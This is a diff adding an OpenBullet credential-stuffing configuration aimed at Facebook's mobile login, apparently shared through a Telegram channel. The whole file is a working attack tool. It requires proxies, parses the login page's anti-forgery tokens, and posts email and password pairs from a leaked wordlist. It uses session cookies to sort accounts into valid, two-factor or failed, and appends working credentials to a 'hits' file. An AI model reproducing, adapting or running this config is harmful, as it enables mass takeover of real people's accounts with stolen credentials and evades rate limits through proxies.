@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "Facebook.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-16T14:13:25.2413163+04:30",
+  "AdditionalInfo": "https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1695411162
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fhome.php&refsrc=https%3A%2F%2Fm.facebook.com%2Fhome.php&_rdr" 
+  
+  HEADER "Host: m.facebook.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#1 PARSE "<SOURCE>" LR "dtsg\":{\"token\":\"" "\"" -> VAR "1" 
+
+#2 PARSE "<SOURCE>" LR "name=\"jazoest\" value=\"" "\"" -> VAR "2" 
+
+#3 PARSE "<SOURCE>" LR "name=\"lsd\" value=\"" "\"" -> VAR "3" 
+
+#4 PARSE "<SOURCE>" LR "name=\"m_ts\" value=\"" "\"" -> VAR "4" 
+
+#5 PARSE "<SOURCE>" LR "name=\"li\" value=\"" "\"" -> VAR "5" 
+
+#Login REQUEST POST "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100" 
+  CONTENT "m_ts=<4>&li=<5>&try_number=0&unrecognized_tries=0&email=<USER>&pass=<PASS>&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&had_cp_prefilled=false&had_password_prefilled=false&is_smart_lock=false&m_sess=&fb_dtsg=<1>&jazoest=<2>&lsd=<3>&__dyn=0wzp5Bwk8aU4ifDgy79pk2m3q12wAxu13w9y1DxW0Oohx61rwf24o29wmU3XwIwk9E4W0om783pwbO0o2US1kw5Kxmayo&__req=9&__ajax__=AYkbGOHTAqPBWedhRIHfEH-kFiBJmDdmTayxDqjTS3OQBinpNmq9rxYX3qOAArwuR2Byhhz4HJlxUBSye6VR7b6k2h4OiJeYukTQr8fy1wnR6A&__user=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: m.facebook.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fhome.php&refsrc=https%3A%2F%2Fm.facebook.com%2Fhome.php&_rdr" 
+  HEADER "X-Response-Format: JSONStream" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Fb-Lsd: AVob7xPH-LQ" 
+  HEADER "Origin: https://m.facebook.com" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(c_user)>" Exists 
+    KEY "<COOKIES(xs)>" Exists 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<COOKIES(checkpoint)>" Exists 
+  KEYCHAIN Failure OR 
+    KEY "provided_or_soft_matched" 
+    KEY "oauth_login_elem_payload" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "Facebook hits.txt" Append "<USER>:<PASS>\\nTelegram Channel: https://t.me/OpenBulletChannel" -> VAR "Save" 
+
